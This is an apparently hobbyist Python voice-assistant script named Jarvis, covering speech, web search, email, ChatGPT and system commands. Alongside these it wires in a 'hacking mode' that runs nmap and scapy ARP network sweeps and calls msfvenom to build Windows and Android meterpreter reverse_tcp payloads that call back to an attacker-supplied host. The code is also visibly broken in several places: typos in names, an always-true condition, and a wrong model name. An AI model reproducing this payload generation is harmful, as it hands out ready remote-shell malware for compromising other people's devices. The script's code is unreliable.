# Author: Arosha Fernando
# Started date: 11/6/2024

import sys
import time
import pyttsx3
import speech_recognition as sr
import datetime
import wikipedia
import webbrowser
import os
import smtplib
import openai
import subprocess
import cv2
import pywhatkit as kit
import scapy.all  as scapy
import re

from wakeonlan import send_magic_packet

# Initialize the text-to-speech engine
engine = pyttsx3.init()
voices = engine.getProperty('voices') # Set voice
engine.setProperty('rate', 180)
engine.setProperty('volume', 1.0)
engine.setProperty('voice', voices[0].id)

openai.api_key = 'add your openai API key'

name = 'Jarvis'
version = '1.0'

def speak(text):
    # Convert text to speech.
    engine.say(text)
    print(text)
    engine.runAndWait()

def wake_on_lan(mac_address):
    send_magic_packet(mac_address)
    print(f"Magic packet sent to {mac_address}")
    wish_me()

def get_mac_address():
    try:
        output = subprocess.check_output("ipconfig /all", shell=True).decode()
        # Use regex to find the MAC address
        mac_address = re.search(r"Physical Address[ .:]*([A-Fa-f0-9-]{17})", output)
        if mac_address:
            return mac_address.group(1)
        else:
            return None
    except Exception as e:
        print(f"Error retrieving MAC address: {e}")
        return None

def wish_me():
    # Greet the user based on the currunt time.
    hour = int(datetime.datetime.now().hour)
    if 0 <= hour < 12:
        speak("Good morning!")
    elif 12 <= hour < 18:
        speak("Good afternoon!")
    else:
        speak("Good evening!")
    speak(f"I am {name}, version {version}. How can I help you?")

def take_command():
    # Listening for a voice comman and convert it to text.
    recognizer = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        recognizer.pause_threshold = 0.8
        try:
            audio = recognizer.listen(source, timeout=5, phrase_time_limit=5)
        except sr.WaitTimeoutError:
            print("Listening timed out while waiting for phrase to start")
            speak("Sorry sir, I didn't hear anything. Please say that again.")
            return "None"
    try:
        print("Recognizing...")
        query = recognizer.recognize_google(audio, language='en-in')
        print(f"User said: {query}\n")
    except sr.UnknownValueError:
        print("Google Speech Recognition could not understand the audio.")
        speak("Sorry, I did not understand. Could you please say that again?")
        return "None"
    except sr.RequestError as e:
        print(f"Could not request results from google speech recognition service: {e}")
        speak("Sorry sir, I'am having trouble connecting to the speeach service. Please try again later.")
        return "None"
    return query.lower()

def send_email(to, content):
    # Send an email.
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login('your_email@gmail.com', 'your_password')
        server.sendmail('your_email@gmail.com', to, content)
        server.close()
        speak("Email has been sent!")
    except Exception as e:
        print(e)
        speak("I am not able to send the email at the moment.")

def chat_gpt(prompt):
    # Get a response from ChatGPT.
    try:
        response = openai.Completion.create(
            engine = "twxt-davinci-003",
            prompt = prompt,
            max_tokens = 150              
        )
        return response.choices[0].text.strip()
    except Exception as e:
        print(f"Error fetching response from ChatGPT: {e}")
        speak("Sorry sir, I'm having trouble connecting to ChatGPT. Please try again later.")
        return "None"

# Networking tools
def network_scan(target):
    try:
        speak(f"Scanning the network for {target}")
        result = subprocess.run(['nmap', '-sP', target], capture_output=True, text=True)
        if result.returncode == 0:
            speak(f"Scanning complete sir. Here are the results: ")
            print(result.stdout)
            speak(result.stdout)
        else:
            speak("Sorry sir, there was an issue with the network scanning.")
            print(f"Error: {result.stderr}")
    except Exception as e:
        print(e)
        speak("Sorry sir, I couldn't complete the network scanning.")

def generate_payload(ip, port):
    try:
        speak(f"Generating payload for IP {ip} and port {port}")
        result = subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', f'LHOST={ip}', f'LPORT={port}', '-f', 'exe', '-o', 'payload.exe'], capture_output=True, text=True)
        print(result.stdout)
        speak("Payload has been generated and saved as payload.exe")
    except Exception as e:
        print(e)
        speak("Sorry sir, I couldn't generate the payload.")

def generate_android_payload(ip, port):
    try:
        speak(f"Generating Android payload for IP {ip} and port {port}")
        result = subprocess.run(
            ['msfvenom', '-p', 'android/meterpreter/reverse_tcp', f'LHOST={ip}', f'LPORT={port}', '-o', 'android_payload.apk'],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            speak("Android payload has been generated and saved as android_payload.apk")
            print(result.stdout)
        else:
            speak("Failed to generate the Android payload.")
            print(result.stderr)
    except Exception as e:
        print(e)
        speak("Sorry sir, I couldn't generate the Android payload.")

def android_handle_query(query):
    if 'generate android payload' in query or 'hack android' in query:
        speak("Please provide the target IP address.")
        ip = input("Enter the IP number: ")
        if ip:
            speak("PLease provide the port number.")
            port = input("Enter the port number: ")
            if port:
                generate_android_payload(ip, port)
                
def scapy_scan():
    try:
        speak("starting scapy network scan.")
        request = scapy.ARP()
        request.pdst = '192.168.0.1/24'
        broadcast = scapy.Ether()
        broadcast.dst = 'ff:ff:ff:ff:ff:ff'
        request_broadcast = broadcast / request
        clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]
        for element in clients:
            print(element[1].psrc + " " + element[1].hwsrc)
            speak(element[1].psrc + " " + element[1].hwsrc)
    except Exception as e:
        print(e)
        speak("Sorry sir, I couldn't complete the Scapy network scan.")

def handle_query1(query):
    # Handle the user's voice command.
    if 'mac address' in query or 'physical address' in query:
        mac_address = get_mac_address()
        if mac_address:
            speak(f"The MAC address is {mac_address}")
        else:
            speak("Sorry sir, I couldn't retrieve the MAC address.")

# Handle query
def handle_query(query):
    # Handle the user's voice command.
    if 'wikipedia' in query:
        speak('Searching Wikipedia...')
        query = query.replace("wikipedia", "")
        try:
            results = wikipedia.summary(query, sentences=10)
            speak("According to Wikipedia")
            print(results)
            speak(results)
        except Exception as e:
            print(e)
            speak("Sorry sir, I couldn't find any information on wikipedia.")

    elif 'come back online JARVIS' in query:
        speak("Hello sir! How can I help you?")

    elif 'open youtube' in query:
        webbrowser.open("https://www.youtube.com/")
        
    elif 'song on youtube' in query:
        kit.playonyt(input("Enter the song name here: "))
        
    elif 'set alarm' in query:
        nn = int(datetime.datetime.now().hour)
        if nn == 22:
            music_dir = 'path to your alarm music'
            songs = os.listdir(music_dir)
            os.startfile(os.path.join(music_dir, songs[0]))
# ---
    elif 'open google' in query or 'google' in query  or 'search' in query or 'open webbrowser' in query:
        speak("Sir, What should I search on google")
        cm = take_command().lower()
        webbrowser.open(f"{cm}")

    elif 'open stack overflow' in query:
        webbrowser.open("https://stackoverflow.com/")

    elif 'play music' in query:
        music_dir = 'C:\\Users\\user\\Desktop\\Songs'
        try:
            songs = os.listdir(music_dir)
            os.startfile(os.path.join(music_dir, songs[0]))
        except Exception as e:
            print(e)
            speak("Sorry sir, I couldn't play music.")

    elif 'the time' in query:
        str_time = datetime.datetime.now().strftime("%H:%M:%S")
        speak(f"The time is {str_time}")

    elif 'open code' in query:
        code_path = "C:\\Users\\user\\AppData\\Local\\Progrrams\\Microsoft VS Code\\bin\\code" # C:\Users\user\AppData\Local\Progrrams\Microsoft VS Code\bin\code.cmd
        try:
            os.startfile(code_path)
        except Exception as e:
            print(e)
            speak("Sorry sir, I couldn't open the code editor.")

    elif 'open command prompt' in query:
        os.system("Start cmd")
        
    elif 'open camera' is query:
        cap = cv2.VideoCapture(0)
        while True:
            ret, img = cap.read()
            cv2.imshow('webcam', img)
            k = cv2.waitKey(50)
            if k == 27:
                break
        cap.release()
        cv2.destroyAllWindows()
        
    elif 'play music' in query:
        music_dir = "C:\\Users\\user\\Desktop\\Songs"
        songs = os.listgir(music_dir)
        # rd = random.choice(songs)
        for song in songs:
            if song.endswith('.mp3'):
                os.startfile(os.path.join(music_dir, songs))
                
    #elif 'ip address' in query:
        #ip = webbrowser.get('https://api/ipify.org').text
        #speak(f"Sir! your IP address is {ip}")
    
    elif 'email to [recipient]' in query:
        try:
            speak("What should I say?")
            content = take_command()
            to = "recipient_email@gmail.com"
            send_email(to, content)
        except Exception as e:
            print(e)
            speak("Sorry, I am not able to send the email.")

    elif 'chat' in query:
        speak("Sure, let's chat.")
        while True:
            user_input = take_command()
            if user_input == "None":
                continue
            if 'stop' in user_input or 'quit' in user_input or 'exit' in user_input:
                speak("Ending chat.")
                break
            response = chat_gpt(user_input)
            speak(response)
            
    elif 'send wp message' in query or 'send whatsapp message' in query:
        kit.sendwhatmsg("+94741940325", "this is testing protocol",4,13)
        time.sleep(120)
        speak("Message has been sent.")

    elif 'network scan' in query or 'scan' in query or 'ip hacking' in query or 'enable hacking mode' in query or 'hack ip' in query or 'hack' or 'network scanning' in query:
        speak("Please provide the target IP range.")
        target = input("Enter the target ip here: ")
        if target != "None":
            network_scan(target)
            
    elif 'generate payload' in query or 'payload' in query or 'ip' in query:
        speak("Please provide the target IP range.")
        ip = input("Enter the target ip here: ")
        if ip != "None":
            speak("Please provide the port number.")
            port = take_command()
            if port == "None":
                return True
            generate_payload(ip, port)
            
    elif 'shutdown' in query:
        os.system("shutdown /s /t 5")
        
    elif 'restart' in query:
        os.system("shutdown /r /t 5")
        
    elif 'sleep' in query:
        os.system("rundll32.exe powerof.dll,SerSuspendState 0,1,0")
        
    # speak("Sir, do you have any other work...")

    elif 'quit' in query or 'shutdown' in query or 'stop' in query or 'exit' in query:
        speak("Goodbye sir! Have a nice day.")
        sys.exit()

if __name__ == "__main__":
    mac_address = "98-E7-43-35-64-E9"
    wake_on_lan(mac_address)
    wish_me()
    active = True
    while active:
        query = take_command()
        if query != "None":
            active = handle_query(query)